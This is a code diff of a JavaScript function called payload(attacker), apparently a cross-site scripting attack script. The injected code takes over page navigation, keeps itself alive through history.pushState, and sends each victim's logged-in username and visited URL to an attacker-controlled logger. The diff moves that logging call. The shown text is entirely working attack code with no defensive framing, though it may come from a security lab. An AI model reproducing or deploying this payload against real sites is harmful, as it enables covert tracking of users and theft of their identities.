@@ -47,10 +47,6 @@ function payload(attacker) {
         $("html").hide();
         $("html").load(href, data, function(){
             $("html").show();
-            if ($("#logged-in-user").length != 0)
-                log(attacker, {"event": "nav", "user": $("#logged-in-user").html(), "url": href});
-            else
-                log(attacker, {"event": "nav", "url": href});
             //$("#query").val("pwned!");   
             addEvents();
             if(flag == 1){
@@ -63,6 +59,10 @@ function payload(attacker) {
                 else
                     history.pushState({"html": $("html").html()}, null, href);
             }
+            if ($("#logged-in-user").length != 0)
+                log(attacker, {"event": "nav", "user": $("#logged-in-user").html(), "url": document.location.pathname + window.location.search});
+            else
+                log(attacker, {"event": "nav", "url": document.location.pathname + window.location.search});
         });
     }
     function addEvents(){
